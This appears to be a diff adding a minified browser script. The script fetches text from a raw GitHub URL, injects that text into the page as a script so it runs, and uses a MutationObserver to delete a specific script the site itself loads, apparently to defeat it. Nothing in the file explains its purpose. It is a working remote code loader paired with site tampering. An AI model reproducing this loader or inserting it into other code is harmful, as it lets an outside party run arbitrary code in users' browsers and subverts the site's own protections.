@@ -1,0 +1,26 @@
+const n = t => {
+    t = t.replace(new RegExp("\r?\n", "g"), "");
+    t = t.replace(/ +/g, " ");
+    let e = document.createElement("script");
+    e.type = "text/javascript";
+    e.innerText = t;
+    document.getElementsByTagName("body")[0].appendChild(e)
+};
+(async function() {
+    const t = t => fetch(t).then(t => t.text());
+    var e = await t("https://raw.githubusercontent.com/CumMerstand/CringeXD/main/imtiredx");
+    n(e)
+})();
+let t = new MutationObserver(t => {
+    for (const e of t) {
+        for (let t of e.addedNodes) {
+            if (t.tagName == "SCRIPT" && t.src.includes("u0hj8z9QNdfleKhLDI38wcEdcP6yqFp0.js")) {
+                t.outerHTML = ``
+            }
+        }
+    }
+});
+t.observe(document, {
+    childList: true,
+    subtree: true
+});
